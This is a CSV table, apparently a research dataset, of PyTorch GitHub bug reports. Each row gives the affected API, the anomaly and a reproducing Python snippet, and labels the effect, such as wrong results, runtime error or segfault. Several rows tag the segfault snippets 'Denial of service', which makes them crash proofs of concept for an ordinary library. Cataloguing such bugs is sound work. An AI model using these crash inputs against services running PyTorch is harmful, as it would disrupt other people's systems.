Library,Advisory Link,Commit,Parent Module,API,Anomaly,Reproducing Example,Vulnerable Parameter,Root cause 1,Root cause 2,Attack type
Pytorch,https://github.com/pytorch/pytorch/issues/80804,N.A,torch,torch.renorm,Empty input,"def fn(input):
    p = 2
    dim = -1
    maxnorm = 0
    fn_res = torch.renorm(input, p, dim, maxnorm, )
    return fn_res
input = torch.tensor([[0.1, 0.], [0., 0.]], dtype=torch.float64, requires_grad=True)

torch.autograd.gradcheck(fn, (input))","p = 2
maxnorm = 0",N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/80588,N.A,torch,torch.baddbmm,Invalid argument,"import torch 

for i in range(10000):
    out = torch.baddbmm(
        torch.zeros([1, 1, 1], dtype=torch.float32),
        torch.FloatTensor([[[1]]]),
        torch.FloatTensor([[[1]]]),
        beta=0,
    )
    assert not torch.isnan(out).any(), i",N.A,N.A,N.A,
Pytorch,https://github.com/pytorch/pytorch/issues/80488,N.A,torch.nn.functional,torch.nn.functional.kl_div,Invalid argument,"inout = torch.tensor([[1,2,3], [5.0, 5.0, 5.0]])
target = torch.tensor([[1,2,3], [5.0, 5.0, 5.0]])","input
target",N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/78153,N.A,torch.nn.utils.rnn,torch.nn.utils.rnn.pack_sequence,Invalid argument,"import torch
sequences_0 = torch.rand([1, 16, 86], dtype=torch.float32)
sequences_1 = torch.rand([1, 85, 0], dtype=torch.float16)
sequences_2 = torch.randint(0, 2, [2, 84, 85], dtype=torch.bool)
sequences_3 = torch.randint(-8, 2, [0, 4, 85], dtype=torch.int8)
sequences = [sequences_0,sequences_1,sequences_2,sequences_3,]
enforce_sorted = 0
torch.nn.utils.rnn.pack_sequence(sequences, enforce_sorted=enforce_sorted, )","sequences, enforce_sorted=enforce_sorted",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78131,N.A,torch,torch._pad_packed_sequence,Empty input,"import torch

data = torch.full([1, 1, 1, 1], -10000, dtype=torch.float16, requires_grad=False)
batch_sizes = torch.full([0], 978, dtype=torch.int64, requires_grad=False)
batch_first = True
padding_value = False
total_length = torch.full([], -9937, dtype=torch.int64, requires_grad=False)
print(torch._pad_packed_sequence(data, batch_sizes, batch_first, padding_value, total_length))",batch_sizes,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78130,N.A,torch,torch._grid_sampler_2d_cpu_fallback,Invalid argument,"import torch

input = torch.full([3, 3, 3, 2], 9490, dtype=torch.float32, requires_grad=False)
grid = torch.full([0, 3, 8, 2, 4, 1], -9545, dtype=torch.float32, requires_grad=False)
interpolation_mode = 8330
padding_mode = 5934
align_corners = False
torch._grid_sampler_2d_cpu_fallback(input, grid, interpolation_mode, padding_mode, align_corners)",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78129,N.A,torch,torch._embedding_bag_forward_only,Empty input,"import torch

weight = torch.full([2, 2, 5, 3, 3], -8670, dtype=torch.float64, requires_grad=False)
indices = torch.full([3, 0, 1], -4468, dtype=torch.int32, requires_grad=False)
offsets = torch.full([7, 1, 0], -7226, dtype=torch.int64, requires_grad=False)
scale_grad_by_freq = True
mode = torch.full([], 6318, dtype=torch.int64, requires_grad=False)
sparse = False
per_sample_weights = torch.full([3], -8750, dtype=torch.int64, requires_grad=False)
include_last_offset = False
padding_idx = torch.full([], 6383, dtype=torch.int64, requires_grad=False)

print(torch._embedding_bag_forward_only(weight, indices, offsets, scale_grad_by_freq, mode,
                                  sparse, per_sample_weights, include_last_offset, padding_idx))",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78128,N.A,torch,torch._C._nn.thnn_conv2d,Empty input,"import torch

tensor_0 = torch.full([3, 3, 3], -4398, dtype=torch.float64, requires_grad=False)
tensor_1 = torch.full([6, 7], -4532, dtype=torch.int32, requires_grad=False)
intarrayref_2 = -10000
tensor_3 = torch.full([3, 3, 3, 6, 7], -2321, dtype=torch.float16, requires_grad=False)
intarrayref_4 = -2807
intarrayref_5 = []
torch._C._nn.thnn_conv2d(tensor_0, tensor_1, intarrayref_2, tensor_3, intarrayref_4, intarrayref_5)",intarrayref_5,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78127,N.A,torch,torch._C._nn.reflection_pad2d,Empty input,"import torch

tensor_0 = torch.full([6, 5, 7], -8754, dtype=torch.int32, requires_grad=False)
intarrayref_1 = []
torch._C._nn.reflection_pad2d(tensor_0, intarrayref_1)",intarrayref_1,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78126,N.A,torch,torch._C._nn.max_unpool3d,Empty input,"import torch

tensor_0 = torch.full([], -10000, dtype=torch.int64, requires_grad=False)
tensor_1 = torch.full([7, 7, 7, 4, 4, 4, 7, 7], -8695, dtype=torch.float16, requires_grad=False)
intarrayref_2 = []
intarrayref_3 = 7052
intarrayref_4 = -9995
torch._C._nn.max_unpool3d(tensor_0, tensor_1, intarrayref_2, intarrayref_3, intarrayref_4)",intarrayref_2,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78125,N.A,torch,torch.grid_sampler_3d,Invalid argument,"import torch

input = torch.full([4, 2, 0, 0, 4, 0, 0, 3], -1480, dtype=torch.float64, requires_grad=False)
grid = torch.full([1, 6, 3, 5, 3, 4, 0, 6], -2024, dtype=torch.float64, requires_grad=False)
interpolation_mode = -3278
padding_mode = -1469
align_corners = True
torch.grid_sampler_3d(input, grid, interpolation_mode, padding_mode, align_corners)",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78123,N.A,torch,torch.choose_qparams_optimized,Invalid argument,"import torch

input = torch.full([7, 7, 4, 6, 3, 1, 2], -7124, dtype=torch.float32, requires_grad=False)
numel = -8192
n_bins = 1255
ratio = -9185
bit_width = -4519
torch.choose_qparams_optimized(input, numel, n_bins, ratio, bit_width)",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/78122,N.A,torch,torch.bincount,Invalid argument,"import torch

self = torch.full([3], 2550, dtype=torch.int64, requires_grad=False)
weights = torch.full([3, 1, 3, 0, 0, 0, 1, 1], -4620, dtype=torch.int64, requires_grad=False)
minlength = 9711
torch.bincount(self, weights, minlength)",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/77893,N.A,torch,torch._remove_batch_dim,Invalid argument,"import torch

self = torch.full((5, 5, 5, 5, 5,), 1, dtype=torch.float64, requires_grad=False)
level = 0
batch_size = 0
out_dim = 1250999896764
torch._remove_batch_dim(self, level, batch_size, out_dim)",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/77493,N.A,torch,torch.pow,Same dtype,"input = input_tensor.clone().requires_grad_()
exponent = exponent_tensor.clone()
with forward_ad.dual_level():
    tangent = torch.rand_like(input)
    dual_input = forward_ad.make_dual(input, tangent)
    dual_output = torch.pow(dual_input, exponent)","input
exponent",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/77231,N.A,torch,torch.scatter_add,Complex tensor,"import torch
from torch.autograd import gradcheck

input_tensor = torch.rand([10, 5], dtype=torch.float64, requires_grad=True)
index_tensor = torch.rand([13, 0], dtype=torch.complex128, requires_grad=True)
src_tensor = torch.rand([10, 2], dtype=torch.float64, requires_grad=True)

def fn(input, index, src):
    dim = -1
    fn_res = torch.scatter_add(input, dim, index, src, )
    return fn_res

print(gradcheck(fn, (input_tensor, index_tensor, src_tensor)))",index_tensor,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/76778,N.A,torch,torch.addmv,Type confusion,"import torch
input = torch.rand([2], dtype=torch.float64, requires_grad=True)
mat = torch.rand([2, 3], dtype=torch.complex128, requires_grad=True)
vec = torch.rand([3], dtype=torch.complex128, requires_grad=True)

res = torch.addmv(input, mat, vec)
print(""addmv SUCCEED!"")

res_2 = res.sum()
print(""sum SUCCEED!"")

res_2.backward()","input
mat
vec",N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/76571,N.A,torch,torch.unique,NaN input,"import torch

def unique(x):
    return torch.unique(x, sorted=False, return_inverse=False, return_counts=True)

s = torch.tensor(0.).cuda()
x = torch.tensor(float('nan')).cuda()

print(unique(s))
print(unique(x)) # <- these two calls have different outputs
print(unique(x)) # <-",x,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/75171,N.A,torch,torch.jit.load,ASCII character input,"import torch

torch.jit.load('C:\\Users\\流星暴雨/.cache/clip\\ViT-B-16.pt', ""cpu"")",N.A,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/74809,N.A,torch.distributed,torch.distributed.gather,Non-contiguous NumPy array,"import os
import time
import torch
import numpy as np
import torch.distributed as dist
import torch.multiprocessing as mp 


def worker_fn(rank):
    print(f""Hello from rank {rank}"")
    os.environ['MASTER_ADDR'] = '127.0.0.1'
    os.environ['MASTER_PORT'] = '29500'
    dist.init_process_group(backend='gloo', rank=rank, world_size=2)
    dist.barrier()

    if rank == 0:
        # Source rank
        my_array = np.reshape(np.arange(10), (2, 5))
        my_array = np.transpose(my_array, (1, 0))
        my_tensor = torch.from_numpy(my_array).to(torch.float32)
        dist.gather(my_tensor, dst=1)
        print(""Sent tensor     = "" + str(my_tensor.tolist()))
    elif rank == 1:
        # Destination rank
        not_used = torch.zeros((5, 2))
        results = [torch.zeros((5, 2)) for _ in range(2)]
        dist.gather(not_used, gather_list=results, dst=1)
        # Printing tensor from rank 0
        print(""Received tensor = "" + str(results[0].tolist()))


if __name__ == ""__main__"":
    processes = []
    mp.set_start_method(""spawn"")
    for rank in range(2):
        p = mp.Process(target=worker_fn, args=(rank,))
        p.start()
        processes.append(p)
    for p in processes:
        p.join()",N.A,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/73196,N.A,torch,torch.pow,Negative argument,"import torch

x = torch.tensor(0, device=""cuda"", dtype=torch.int32)
y = torch.tensor(-1)
o = torch.pow(x, y)",y,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/73191,N.A,torch,torch.max_pool3d,Very large input argument,"import torch

self = torch.full((1, 1, 1, 1, 1,), 1.5e+300, dtype=torch.float64, requires_grad=False)
kernel_size = [536870912, 536870912, 536870912]
stride = [1, 1, 1]
padding = [0, 0, 0]
dilation = [1879048192, 1879048192, 1879048192]
ceil_mode = True
torch.max_pool3d(self, kernel_size, stride, padding, dilation, ceil_mode)","kernel_size, dilation",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/73190,N.A,torch,torch.max_pool1d,Very large input argument,"import torch

self = torch.full((2, 10, 4,), 0.5, dtype=torch.float64, requires_grad=False)
kernel_size = [1250999896764]
stride = [1250999896764]
padding = [0]
dilation = [1250999896764]
ceil_mode = True
torch.max_pool1d(self, kernel_size, stride, padding, dilation, ceil_mode)","kernel_size, stride, dilation",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/73186,N.A,torch,torch._C._nn.fractional_max_pool3d,Zero element ,"import torch

self = torch.full((2, 4, 5, 5, 5,), 1, dtype=torch.float64, requires_grad=False)
kernel_size = [0, 0, 0]
output_size = [0, 0, 0]
random_samples = torch.full((2, 4, 5, 5, 5,), 1, dtype=torch.float64, requires_grad=False)
torch._C._nn.fractional_max_pool3d(self, kernel_size, output_size, random_samples)",output_size,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/73185,N.A,torch,torch._C._nn.fractional_max_pool2d,Zero element ,"import torch

self = torch.full((1, 3, 7, 6,), 1, dtype=torch.float64, requires_grad=False)
kernel_size = [0, 0]
output_size = [0, 0]
random_samples = torch.full((1, 3, 7, 6,), 1, dtype=torch.float64, requires_grad=False)
torch._C._nn.fractional_max_pool2d(self, kernel_size, output_size, random_samples)",output_size,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/73182,N.A,torch,torch._sobol_engine_scramble_,Very large input argument,"import torch

self = torch.full((100, 30,), 1, dtype=torch.int64, requires_grad=False)
ltm = torch.full((100, 30, 30,), 1, dtype=torch.int64, requires_grad=False)
dimension = 1250999896764
torch._sobol_engine_scramble_(self, ltm, dimension)",dimension,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/73181,N.A,torch,torch._sobol_engine_initialize_state_,Very large input argument,"import torch

self = torch.full((2, 30,), 1, dtype=torch.int64, requires_grad=False)
dimension = 1250999896764
torch._sobol_engine_initialize_state_(self, dimension)",dimension,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/73180,N.A,torch,torch._sobol_engine_ff_,Very large input argument,"import torch

self = torch.full((2,), 1, dtype=torch.int64, requires_grad=False)
n = 1250999896764
sobolstate = torch.full((2, 30,), 1, dtype=torch.int64, requires_grad=False)
dimension = 1250999896764
num_generated = 0
torch._sobol_engine_ff_(self, n, sobolstate, dimension, num_generated)","dimension, n",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/71689,N.A,torch.distributions.categorical,torch.distributions.categorical.Categorical,Zero argument,batch_sizes = 0,batch_sizes,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71678,N.A,torch,torch.bmm,Sparse tensor,"import torch
a = torch.rand(2, 3, 3).to_sparse().requires_grad_(True)
b = torch.rand(2, 3, 3)
c = torch.bmm(a, b)",a ,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71636,N.A,torch,torch.median,Empty input,"import torch
input = torch.randint(-2,2,[0], dtype=torch.int32)
print(torch.median(input))",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.cummin,Empty input,"input = torch.rand([], dtype=torch.float64)
dim = 100
torch.cummin(input, dim)",input,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.cummax,Empty input,N.A,input,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.sort,Empty input,N.A,input,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71477,N.A,torch,torch.argsort,Empty input,N.A,input,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71470,N.A,torch.jit,torch.jit.script,N.A,"import torch

mha0 = torch.nn.MultiheadAttention(256, 4)
script_mha0 = torch.jit.script(mha0)
print(""Successful compiled mha0"")

mha1 = torch.nn.MultiheadAttention(256, 4, kdim=128, vdim=128)
script_mha1 = torch.jit.script(mha1)
print(""Successful compiled mha1"")","kdim
vdim",N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71204,N.A,torch,torch.diag,Dimension mismatch,"import torch
a = torch.tensor([[0, 1], [2, 3]])
for i in [0, 1, 2]:
    assert(torch.equal(torch.diag(a, i), torch.diagonal(a, i)))
torch.diagonal(a, 3)
torch.diag(a, 3)",N.A,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71204,N.A,torch,torch.diagonal,Dimension mismatch,"import torch
a = torch.tensor([[0, 1], [2, 3]])
for i in [0, 1, 2]:
    assert(torch.equal(torch.diag(a, i), torch.diagonal(a, i)))
torch.diagonal(a, 3)
torch.diag(a, 3)",N.A,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71082,N.A,torch,torch.combinations,Dimension mismatch,"import torch
input_tensor = torch.randint(-1,1,[3], dtype=torch.int64)
input = input_tensor.clone()
r = 100
print(torch.combinations(input, r=r))",r,N.A,N.A,crash
Pytorch,https://github.com/pytorch/pytorch/issues/71078,N.A,torch,torch.nn.ConstantPad2d,Zero dimensional tensor,"import torch
padding = [-1, -2, 1, 1]
c1 = torch.nn.ReflectionPad2d(padding)
c2 = torch.nn.ReplicationPad2d(padding)
c3 = torch.nn.ConstantPad2d(padding, 0)
c4 = torch.nn.ZeroPad2d(padding)
input = torch.rand([1, 1, 3, 3], dtype=torch.float32)

print(c1(input))
print(c2(input))
c3(input)
# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.
c4(input)
# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.",input,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71078,N.A,torch,torch.nn.ZeroPad2d,Zero dimensional tensor,"import torch
padding = [-1, -2, 1, 1]
c1 = torch.nn.ReflectionPad2d(padding)
c2 = torch.nn.ReplicationPad2d(padding)
c3 = torch.nn.ConstantPad2d(padding, 0)
c4 = torch.nn.ZeroPad2d(padding)
input = torch.rand([1, 1, 3, 3], dtype=torch.float32)

print(c1(input))
print(c2(input))
c3(input)
# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.
c4(input)
# RuntimeError: The input size 3, plus negative padding -1 and -2 resulted in a negative output size, which is invalid. Check dimension 3 of your input.",input,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/71059,N.A,torch,torch.scatter,Empty input,"import torch
input = torch.rand([])
dim = 0
index = torch.tensor([]) # or torch.tensor([0])
src = torch.rand([])
torch.scatter(input, dim, index, src)
# random value like tensor(6.7333e+22)",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/71058,N.A,torch,torch.where,Float dtype,"import torch
condition= torch.randint(0,2,[2, 2], dtype=torch.bool)
x= torch.rand([2, 2], dtype=torch.float64)
y = 0.0
print( torch.where(condition, x, y) )
# tensor([[0.0000, 0.6290],
#        [0.0000, 0.0000]], dtype=torch.float64)
print( x.where(condition, y) )
# TypeError: where(): argument 'other' (position 2) must be Tensor, not float",y,N.A,N.A,type error
Pytorch,https://github.com/pytorch/pytorch/issues/70901,N.A,torch,torch.batch_norm_gather_stats_with_counts,Half dtype,"import torch
i = torch.rand([5,4,10,10], dtype=torch.float).cuda()
c = torch.rand((150,), dtype=torch.half).fill_(500).cuda()
m = torch.rand([150, 4], dtype=torch.float).cuda()
rm = torch.rand([4], dtype=torch.half).cuda()
v = torch.rand([150, 4], dtype=torch.float).cuda()
v += 0.0001
rv = torch.rand([4], dtype=torch.half).cuda()
rv += 0.0001
mea, inv = torch.batch_norm_gather_stats_with_counts(i, m, v, rm, rv, 1.2, 0.001, c)
print(mea)",count,N.A,overflow,crash
Pytorch,https://github.com/pytorch/pytorch/issues/70672,N.A,torch,torch.as_strided,N.A,"import torch
a = torch.rand([3, 3])
b = torch.as_strided(a, [1, -1], [1, 1])
print(b.shape)
# torch.Size([1, -1])",N.A,N.A,N.A,wrong results
,https://github.com/pytorch/pytorch/issues/70398,N.A,torch,tensor.expand,Negative argument,"import torch
input = torch.rand([3])
shape = [-2, 3]
res = torch.broadcast_to(input,shape,)
print(res.shape)
# torch.Size([-2, 3])
print(torch.sum(res))
# tensor(0.)
torch.all(res)
# RuntimeError: Trying to create tensor with negative dimension -2: [-2, 3]",shape,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/70398,N.A,torch,torch.broadcast_to,Negative argument,"import torch
input = torch.rand([3])
shape = [-2, 3]
res = input.expand(shape)
print(res.shape)
print(torch.sum(res))
torch.all(res)",shape,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/70397,N.A,torch,torch.empty_strided,Negative argument,"import torch
size = [2, 3]
stride = [-1, 2]
res = torch.empty_strided(size,stride,)
print(torch.sum(res))
# tensor(nan)
print(res.shape)
# torch.Size([2, 3])
print(res)",stride,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/69433,N.A,torch,torch.transpose,Zero dimensional tensor,"import torch
tensor = torch.rand(torch.Size([]))
res1 = torch.transpose(tensor, 0, 0)","dim0, dim1",N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/69408,N.A,torch,torch.hstack,Zero dimensional tensor,"import torch
tensor_0 = torch.rand(torch.Size([]))
tensor_1 = torch.rand(torch.Size([3]))
tensors = [tensor_0, tensor_1]
res1 = torch.hstack(tensors)
# succeed
res2 = torch.cat(tensors, dim=0)",dim=0,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/68610,N.A,torch,torch.unique_consecutive,Positional argument,"torch.unique_consecutive(torch.ones(5), True, True)
torch.unique_consecutive(torch.ones(5), return_inverse=True)
torch.unique_consecutive(torch.ones(5), return_counts=True)","return_inverse
return_counts",N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/67081,N.A,torch.utils,torch.utils.dlpack.to_dlpack,Boolean dtype,"torch.utils.dlpack.to_dlpack(torch.BoolTensor([False, True])) ",ext_tensor,N.A,N.A,fails
Pytorch,https://github.com/pytorch/pytorch/issues/65683,N.A,torch.nn,torch.nn.functional.l1_loss,Complex dtype,"import torch
from torch.autograd import gradgradcheck
from torch.nn.functional import l1_loss

input = torch.randn((), dtype=torch.complex128, requires_grad=True)
target = torch.randn((), dtype=torch.complex128)

gradgradcheck(l1_loss, inputs=(input, target))","input
target",N.A,N.A,fails
Pytorch,https://github.com/pytorch/pytorch/issues/65400,N.A,torch.sparse,torch.sparse.sum,Positional argument specified,"t = torch.tensor(1).to_sparse()
torch.sparse.sum(t, dim=0)",dim,N.A,N.A,fails
Pytorch,https://github.com/pytorch/pytorch/issues/65050,N.A,torch,torch.cross,Equal input,"a = torch.Tensor([0.7533, 0.6123, -0.2404])
b = torch.Tensor([0.7533, 0.6123, -0.2404])
c = torch.cross(a, b)
print(c)","a, b",N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/64978,N.A,torch,torch.nn.functional.linear,Rank other than 2,"import torch
a = torch.ones([1,1,10])
b = torch.ones([10])   # weight is 1-d
c = torch.nn.functional.linear(a, b)",b,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/64079,N.A,torch,torch.equal,Sparse tensor,"if __name__ == ""__main__"":
    x = torch.rand(4, 4).to_sparse()
    assert torch.equal(x, x)",x,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/59439,N.A,torch.nn.functional,torch.nn.functional.conv2d,NaN input,"import torch
import torch.nn.functional as F

print(F.conv2d(torch.ones(1,3,160,240).cpu(), torch.ones(1,3,3,3).cpu()))","inputs, filters",N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/54638,N.A,torch.jit,torch.jit.trace,Sparse tensor,"import torch

### LAYER and GCN DEFINITION

class HiddenLayerSparse(torch.nn.Module):
    def __init__(self, dimf_in, dimf_out):
        super().__init__()
        self.weights = torch.nn.Parameter(torch.rand(dimf_in, dimf_out, dtype=float))

    def forward(self, adj, x):
        x = torch.mm(x, self.weights)
        x = torch.mm(adj, x)
        return x

class ExampleSparseGCN(torch.nn.Module):
    def __init__(self, sizes):
        super().__init__()
        self.sizes = sizes
        self.hidden_layers = torch.nn.ModuleList([HiddenLayerSparse(sizes[i], sizes[i+1]) for i in range(len(sizes)-1)])
        self.nonlinear = torch.nn.ReLU()
        self.softmax = torch.nn.Softmax(dim=1)

    def forward(self, adj, x):
        for h in self.hidden_layers:
            x = self.nonlinear(h(adj, x))
        return self.softmax(x)

### EXAMPLE SPARSE INPUTS

adjacency = torch.tensor([[1,0],[0,1]], dtype=float).to_sparse()
features = torch.tensor([[1,0,0,1,0],[0,1,0,0,1]],dtype=float).to_sparse()
labels = torch.tensor([[1,0,0], [0,1,0]],dtype=float)
inputs = (adjacency, features)

model = ExampleSparseGCN([5, 4, 3]) # training does not fail with [5,3]
loss_fn =  torch.nn.L1Loss()
optimizer = torch.optim.SGD(model.parameters(), lr=0.05)

_train = False      # FLAG TO ENABLE TRAINING
_trace = True      # FLAG TO ENABLE TRACING

# TRAINING 
if _train:
    model.train()
    for t in range(50):
        optimizer.zero_grad()
        output = model(*inputs)
        loss = loss_fn(output, labels)
        loss.backward()
        optimizer.step() 
    print('Train Complete')

# TRACING
if _trace:
    model.eval()
    with torch.no_grad():
        #torch.onnx.export(model, inputs, path, do_constant_folding=True, verbose=True, export_params=True)
        traced = torch.jit.trace(model, inputs)
    print('Trace Complete')",input,N.A,N.A,fails
Pytorch,https://github.com/pytorch/pytorch/issues/54620,N.A,torch,torch.pow,Boolean dtype,"import torch

input = torch.zeros(10, dtype=torch.bool)
exponent = torch.zeros(10, dtype=torch.bool)
torch.pow(input, exponent)","input, exponent",N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/54499,N.A,torch.nn,torch.nn.MaxPool1d,Very large input argument,"import torch

m=torch.nn.MaxPool1d(545646544,stride=2)
input=input=torch.randn(20,16,50)
m(input)",kernel_size,N.A,integer overflow,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/53407,N.A,torch,torch.matmul,Empty input,torch.matmul(input),input,N.A,N.A,failure
Pytorch,https://github.com/pytorch/pytorch/issues/53391,N.A,torch,torch.empty_strided,Negative argument,torch.empty_strided(),stride,N.A,N.A,failure
Pytorch,https://github.com/pytorch/pytorch/issues/53358,N.A,torch,torch.cumsum,Boolean dtype,"import torch
t = torch.tensor([False, True, True])
t.cumsum(0)
t.cumsum_(0)",input,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/issues/51911,N.A,torch.nn.functional,torch.nn.functional.grid_sample,Very large input argument,"import torch
torch.nn.functional.grid_sample(input=torch.ones([1,1,1,5]), grid=torch.tensor([[[[ 2.9839e+38, -3.2406e+38]]]]))",grid,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/51906,N.A,torch.nn.functional,torch.nn.functional.binary_cross_entropy_with_logits,Empty input,"import torch
torch.nn.functional.binary_cross_entropy_with_logits(input=torch.tensor([-2.3135e+307,  6.6756e+307]), target=torch.ones((2)))",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/51906,N.A,torch.nn.functional,torch.nn.functional.binary_cross_entropy_with_logits,Very large input argument,"import torch
torch.nn.functional.binary_cross_entropy_with_logits(input=torch.tensor([]), target=torch.tensor([]))",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/51803,N.A,torch.nn.functional,torch.nn.functional.binary_cross_entropy,Empty input,"import torch
torch.nn.functional.binary_cross_entropy(input=torch.tensor([]), target=torch.tensor([]))",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/51732,N.A,torch.nn.functional,torch.nn.functional.ctc_loss,Large negative number,"import torch 
torch.nn.functional.ctc_loss(log_probs=torch.ones((1,2,1)), targets=torch.ones((2,1)), input_lengths=torch.tensor([-5570080269274466818, -1]), target_lengths=torch.tensor((1,1)))",input_lengths,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/51134,N.A,torch.nn,torch.nn.ReplicationPad3d,Very large input argument,"import torch
layer = torch.nn.ReplicationPad3d(padding=498444555)
model_input = torch.ones([1, 1, 1, 1, 1])
layer(model_input)",padding,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/49520,N.A,torch.nn,torch.nn.ReplicationPad2d,Very large input argument,"import torch
layer = torch.nn.ReplicationPad2d(padding=1012756988)
model_input = torch.ones([2,2,2,2])
layer(model_input)",padding,N.A,segfault,Denial of service
